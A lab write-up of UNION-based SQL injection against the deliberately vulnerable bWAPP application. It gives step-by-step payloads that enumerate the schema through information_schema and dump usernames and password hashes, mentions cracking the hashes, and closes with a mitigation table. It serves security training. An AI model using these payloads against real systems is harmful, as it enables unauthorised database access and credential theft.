# SQL Injection – Data Extraction & Password Cracking

## 1. Description
SQL Injection (SQLi) is a critical vulnerability that occurs when user input is embedded directly into SQL queries without proper sanitization.  
Attackers can manipulate queries to retrieve unauthorized data, modify database contents, or perform administrative operations.

In this bWAPP module, the `title` GET parameter is directly included in a SQL query without sanitization.  
This allows attackers to enumerate database schema, extract user credentials, and crack password hashes.

---

## 2. CVSS Score & Severity
- **Severity:** Critical  
- **CVSS v3.1 Base Score:** 9.8  

---

## 3. Impact
- **Database Dump** – Retrieve usernames, password hashes, emails, and other sensitive data.  
- **Authentication Bypass** – Use extracted credentials to log in as legitimate users.  
- **Privilege Escalation** – Access admin accounts from leaked credentials.  
- **Data Integrity Loss** – Modify or delete database entries.  
- **Full Application Compromise** – Combine with cracked credentials for complete control.  

---

## 4. Attack Vector
**Vulnerable parameter:**  
```
GET method: title in /sqli_1.php
```
<img width="602" height="250" alt="image" src="https://github.com/user-attachments/assets/1b9784eb-d857-42b9-ba7e-7f5b94ebb6dc" />

---

## 5. Vulnerability Scan
**Confirmed using:**
- Manual SQL Injection testing via browser  
- Enumeration of `users` table  
- Extraction of password hashes  
- Hash cracking via **CrackStation** revealing plaintext passwords  

---

## 6. How the Attack is Performed
### Step 1: Identifying SQL Injection Point 
We start by testing a vulnerable login or search input with a simple payload (`'`) to check if the application is susceptible to SQL Injection. We can see it returns an error message with the type of SQL used(MySQL)
<img width="1280" height="597" alt="image" src="https://github.com/user-attachments/assets/de17504d-7cab-4bd6-b750-e14a39c3f9ae" />

## Step 2: Confirming Column Count  
We use the `ORDER BY` technique to determine the number of columns in the target table.

```sql
' ORDER BY 4 --
```
<img width="602" height="250" alt="image" src="https://github.com/user-attachments/assets/b6bfbf3d-39c4-4eef-8a24-40248cf8f7f6" />

## Step 3: Column  Extraction
We retrieve the total columns using the UNION SELECT method.
```
' UNION SELECT 1,2,3,4,5,6,7 -- -
```
<img width="602" height="249" alt="image" src="https://github.com/user-attachments/assets/34914245-fdd7-4c80-ae5a-0d3eee5ec63b" />

## Step 4: Database Name Extraction
We retrieve the current database name using the UNION SELECT method. 
``` sql
' UNION SELECT 1, 2, 3, 4, database(), 6, 7 --
```
<img width="602" height="281" alt="image" src="https://github.com/user-attachments/assets/3c1e0907-8988-49be-b51b-8cce79514d15" />

## Step 4: Listing Tables in the Database
We query the information_schema.tables to find all table names.
``` sql
' UNION SELECT 1,2,3,4,table_name,6,7 FROM information_schema.tables --
```
<img width="602" height="250" alt="image" src="https://github.com/user-attachments/assets/b4d92949-b5f0-4213-a288-46addac09430" />

## Step 5: Retrieving details Columns of containing passwords
Once we identify a list of tables, we try to find tables containing sensitive data like passwords.
``` sql
' UNION SELECT 1,2,3,4,table_name,6,7 FROM information_schema.columns where column_name="password" --
```
<img width="602" height="250" alt="image" src="https://github.com/user-attachments/assets/ddca7422-cfe6-4e75-9947-9cb76f8533b5" />

## Step 5: Retrieving Columns of a Target Table
Once we identify a table of interest (e.g., users), we list its columns.
``` sql
' UNION SELECT 1,2,3,4,column_name,6,7 FROM information_schema.columns where table_name="users" --
```
<img width="602" height="249" alt="image" src="https://github.com/user-attachments/assets/9af4cd97-af11-4807-bb28-bb9bbf133cf4" />

Step 6: Extracting Usernames & Password Hashes
Now we dump data from the target table.
```sql
' UNION SELECT 1,login,3,4,password,6,7 FROM users --
```
<img width="602" height="251" alt="image" src="https://github.com/user-attachments/assets/f80b984e-5d3a-4116-bd8e-627042207424" />

## Step 7: Prevention & Mitigation

| Method                   | Description                                                                                   |
|--------------------------|-----------------------------------------------------------------------------------------------|
| **Parameterized Queries**| Use prepared statements with bound parameters (e.g., PDO, `mysqli` in PHP) to avoid injections.|
| **Input Validation**     | Reject or sanitize special SQL characters from user input before processing.                  |
| **Least Privilege Principle** | Limit database user rights — remove unnecessary privileges like `DROP` or `DELETE`.        |
| **WAF Protection**       | Deploy a Web Application Firewall to detect and block SQL injection patterns.                 |
| **Error Handling**       | Suppress detailed SQL error messages from being displayed to end users.                        |
| **Security Testing**     | Perform regular penetration tests using tools like **SQLMap**, **Burp Suite**, and **OWASP ZAP**. |


